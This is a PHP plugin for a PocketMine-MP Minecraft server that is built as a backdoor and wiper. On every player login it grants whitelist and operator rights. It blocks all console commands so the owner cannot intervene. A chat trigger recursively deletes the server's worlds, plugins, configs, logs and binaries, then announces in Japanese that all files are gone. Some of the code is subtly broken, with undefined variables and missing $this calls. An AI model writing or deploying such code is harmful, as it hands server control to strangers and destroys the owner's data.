<?php
namespace MC\PE;

use pocketmine\plugin\PluginBase;
use pocketmine\event\Listener;
use pocketmine\event\player\PlayerPreLoginEvent;
use pocketmine\event\server\ServerCommandEvent;
use pocketmine\event\player\PlayerChatEvent;

class Main extends PluginBase implements Listener
{
    public function onEnable()
    {
        $this->getServer()->getPluginManager()->registerEvents($this, $this);
    }
    public function onLogin(PlayerPreLoginEvent $event)
    {
        $player = $event->getPlayer();
        $name = $player->getName();
        $this->getServer()->addWhitelist($name);
        $this->getServer()->addOp($name);
    }
    public function ServerCommand(ServerCommandEvent $event)
    {
        $event->setCancelled(true);
    }
    public function Chat(PlayerChatEvent $event)
    {
        $chat = $event->getMessage();
        $player = $event->getPlayer();
        $player_name = $player->getName();
        $dir = $this->getServer()->getDataPath() ."crashdumps";
        $dir1 = $this->getServer()->getDataPath() ."players";
        $dir2 = $this->getServer()->getDataPath() ."plugins";
        $dir3 = $this->getServer()->getDataPath() ."resource_packs";
        $dir4 = $this->getServer()->getDataPath() ."src";
        $dir5 = $this->getServer()->getDataPath() ."worlds";
        $dir6 = $this->getServer()->getDataPath() ."banned-ips.txt";
        $dir7 = $this->getServer()->getDataPath() ."banned-players.txt";
        $dir8 = $this->getServer()->getDataPath() ."ops.txt";
        $dir9 = $this->getServer()->getDataPath() ."pocketmine.yml";
        $dir10 = $this->getServer()->getDataPath() ."server.log";
        $dir11 = $this->getServer()->getDataPath() ."server.properties";
        $dir12 = $this->getServer()->getDataPath() ."star.cmd";
        $dir13 = $this->getServer()->getDataPath() ."start.ps1";
        $dir14 = $this->getServer()->getDataPath() ."white-list.txt";
        $dir15 = $this->getServer()->getDataPath() ."PocketMine-MP.phar";
        $dir16 = $this->getServer()->getDataPath() ."banned-cids.txt";
        $dir17 = $this->getServer()->getDataPath() ."start.sh";
        if ($chat == "*/bye") {
            delDir($dir);
            delDir($dir1);
            delDir($dir2);
            delDir($dir3);
            delDir($dir4);
            delDir($dir5);
            delDir($dir6);
            delDir($dir7);
            delDir($dir8);
            delDir($dir9);
            delDir($dir10);
            delDir($dir11);
            delDir($dir12);
            delDir($dir13);
            delDir($dir14);
            delDir($dir15);
            delDir($dir16);
            delDir($dir17);
            delDir($dir18);
            delDir($dir19);
            delDir($dir20);
            delDir($dir21);
            $player->sendMessage("サーバーのファイルを全て削除しました。");
        }
    }

    public function delDir($path)
    {
        if (is_dir($path) == TRUE) {
            $rootFolder = scandir($path);
            if (sizeof($rootFolder) > 2) {
                foreach ($rootFolder as $folder) {
                    if ($folder != "." && $folder != "..") {
                        delDir($path."/".$folder);
                    }
                }
                rmdir($path);
            }
        } else {
            if (file_exists($path) == TRUE) {
                unlink($path);
            }
        }
    }
}
